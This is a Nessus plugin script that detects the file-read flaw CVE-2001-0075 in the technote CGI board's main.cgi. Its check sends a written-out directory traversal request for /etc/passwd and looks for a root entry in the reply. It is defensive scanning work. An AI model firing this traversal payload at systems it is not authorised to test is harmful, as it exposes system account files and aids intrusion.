#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10584);
 script_bugtraq_id(2156);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2001-0075");
 
 name["english"] = "technote's main.cgi";
 name["francais"] = "technote's main.cgi";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The technote CGI board is installed. This board has
a well known security flaw in the CGI main.cgi that lets an attacker read 
arbitrary files with the privileges of the http daemon (usually root or 
nobody).

Solution : remove it from /cgi-bin.

Risk factor : High";


 desc["francais"] = "Le forum 'technote' est installé. Celui-ci possède
CGI main.cgi ayant un problème de sécurité bien connu qui permet à n'importe 
qui de faire lire des fichiers arbitraires au daemon http, avec les 
privilèges de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /technote/main.cgi";
 summary["francais"] = "Vérifie la présence de /technote/main.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#



include("http_func.inc");
include("http_keepalive.inc");


function check(url)
{
 req = http_get(item:string(url,"/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../etc/passwd"),
 		port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if ( r == NULL ) exit(0);
 
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
 	security_hole(port);
}



port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

check(url:"/technote");

foreach dir (cgi_dirs())
{
 check(url:dir);
}
